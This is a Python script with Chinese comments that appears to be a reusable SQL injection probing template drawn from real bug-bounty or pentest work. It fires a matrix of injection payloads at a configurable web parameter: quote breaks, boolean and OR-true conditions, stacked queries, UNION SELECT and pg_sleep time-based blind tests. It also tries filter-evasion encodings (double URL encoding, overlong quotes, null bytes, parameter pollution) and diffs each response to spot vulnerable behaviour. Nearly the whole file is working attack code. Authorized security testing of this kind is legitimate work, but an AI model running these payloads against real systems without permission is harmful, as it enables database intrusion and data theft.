# -*- coding: utf-8 -*-
"""
SQL 注入入参矩阵探针 · 模板(来源:Figma r87/r106-r108 实战提炼)
用法:
  1. 改 CONFIG 区(url / param / hit / miss / extra / headers / normalize)
  2. python _sqli_matrix_template.py
  3. 输出 = [ID] status len diff_vs_base;逐条对照 01-SQL入参矩阵.md(槽位)+ 06-送达与过障.md(通道)与 03-判读库.md 判读记录

要点:
  - 值位(V 槽位)用 requests 的 params=(自动单重 URL 编码)——这是最常见的送达形态
  - 通道组(A/B 族)手动拼原始 querystring(绝对控制编码层次,如 %2527 / %C0%A7 / %00)
  - normalize 里的正则先把动态字段(score/时间戳)抹平,再做逐字节 diff
  - diff=0 → "存活命中"(清洗后=base);diff=@N → 定位首个差异字符再归因
"""
import re, time, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests
import urllib.parse as up

# ================= CONFIG(改这里) =================
CFG = {
    'name': 'demo',
    'url': 'https://target.example/api/search',
    'method': 'GET',                 # GET / POST
    'param': 'query',                # 被测试参数名
    'hit': 'team',                   # 合法命中值(必须人工先验证 200 非空!)
    'miss': 'zzzznomatchvalue',      # 空集值
    'extra': {'sort': 'relevancy'},  # 其他合法参数
    'headers': {'User-Agent': 'Mozilla/5.0'},
    'normalize': [r'"score":\s*[\d.]+', r'"updated_at":"[^"]*"'],  # 动态字段归一化
    'sleep': 0.4,
}
# ====================================================

DYNAMIC = [re.compile(p) for p in CFG.get('normalize', [])]
def norm(t):
    for r in DYNAMIC:
        t = r.sub('"X":0', t)
    return t

s = requests.Session(); s.headers.update(CFG['headers'])
try: s.trust_env = False
except Exception: pass

BASE_N = None

def send(tag, payload, raw_qs=None, note=''):
    global BASE_N
    try:
        if raw_qs is not None:
            r = s.request(CFG['method'], CFG['url'] + '?' + raw_qs, timeout=30)
        else:
            params = dict(CFG['extra']); params[CFG['param']] = payload
            if CFG['method'] == 'GET':
                r = s.request('GET', CFG['url'], params=params, timeout=30)
            else:
                r = s.request('POST', CFG['url'], params=CFG['extra'],
                              json={CFG['param']: payload}, timeout=30)
    except Exception as e:
        print(f'[{tag}] ERR {repr(e)[:100]}  {note}'); time.sleep(CFG['sleep']); return None
    body = r.text
    n = norm(body)
    diff = '-'
    if BASE_N is not None:
        if n == BASE_N:
            diff = '0'
        else:
            i = next((k for k in range(min(len(n), len(BASE_N))) if n[k] != BASE_N[k]), None)
            diff = f'@{i}' if i is not None else f'len{len(n)}vs{len(BASE_N)}'
    mark = ''
    if r.status_code >= 500 or 'SQLSTATE' in body or 'quote' in body.lower():
        mark = ' <<<'
    print(f'[{tag}] {r.status_code} len={len(body):6d} diff={diff:12s}{mark}  {note}')
    time.sleep(CFG['sleep'])
    return r

print(f'==== {CFG["name"]} 入参矩阵开始 ====')
print('--- P1/P2 三态 + P3 稳定性 ---')
r = send('BASE_hit', CFG['hit'])
BASE_N = norm(r.text) if r else None
send('CTRL_miss', CFG['miss'])
send('CTRL_hit2', CFG['hit'], note='(稳定性:应与 BASE 完全一致否则查动态字段)')

print('--- V 槽位:值位 payload 库(基础条) ---')
H = CFG['hit']
for tag, p, note in [
    ('V1_q',     f"{H}'",            '单引号'),
    ('V1_dq',    f'{H}"',            '双引号'),
    ('V1_bt',    f'{H}`',            '反引号'),
    ('V1_cmt',   f"{H}'--",          '注释'),
    ('V1_blk',   f"{H}'/*",          '未闭合块注释'),
    ('V1_hash',  f'{H}#',            'hash'),
    ('V1_true',  f"{H}' AND '1'='1", '布尔真'),
    ('V1_false', f"{H}' AND '1'='2", '布尔假(须与真不同才=信号)'),
    ('V1_or',    f"{H}' OR '1'='1",  'OR 全表'),
    ('M1_stack', f"{H}';SELECT 1--", '堆叠'),
    ('V2_num',   f'{H} AND 1=1',     '数字型'),
    ('V5_like',  f'{H}%',            'LIKE 通配'),
    ('B8_case',  f"{H}' oR '1'='1",  '大小写变形'),
    ('V1_uni',   f"{H}' UNION SELECT NULL--", 'UNION'),
]:
    send(tag, p, note=note)

print('--- A/B 通道族:结构/编码(手动 querystring) ---')
enc = lambda v: up.quote(v, safe='')
eq = up.urlencode(CFG['extra'])
P = CFG['param']
for tag, qs, note in [
    ('A1_arr',  f'{P}[]={enc(H)}&{eq}',                      '数组语法(看解析层是否拒/逼内部名)'),
    ('A2_hpp',  f'{P}={enc(H)}&{P}={enc(CFG["miss"])}&{eq}', 'HPP(取头/尾?)'),
    ('B2_dbl',  f'{P}=%2527{H}&{eq}',                        '双重编码'),
    ('B3_ovl',  f'{P}={enc(H)}%C0%A7&{eq}',                  'overlong 引号'),
    ('B4_uq',   f'{P}={enc(H)}%E2%80%99&{eq}',               'U+2019 花式引号'),
    ('B5_bs',   f'{P}={enc(H)}%5C%27&{eq}',                  '反斜杠+引号'),
    ('B7_null', f'{P}={enc(H)}%00&{eq}',                     'null-byte(URL层)'),
    ('B7_n2',   f'{P}=%00&{eq}',                             'null-byte(纯)'),
]:
    send(tag, None, raw_qs=qs, note=note)

print('--- 时间盲注(3+3 统计;V1 值位/M1 堆叠构造) ---')
import time as _t
for i in range(3):
    t0 = _t.time(); send(f'TIME_base{i}', H)
    print(f'        -> {int((_t.time()-t0)*1000)}ms')
for i in range(3):
    t0 = _t.time(); send(f'TIME_slp{i}', f"{H}';SELECT pg_sleep(3)--")
    print(f'        -> {int((_t.time()-t0)*1000)}ms')

print('==== 完成:① 对照 01-SQL入参矩阵(槽位)+ 06(通道)逐条记录状态;② 崩/差异项去 03-判读库归因;③ 缺口补打后出对账表 ====')
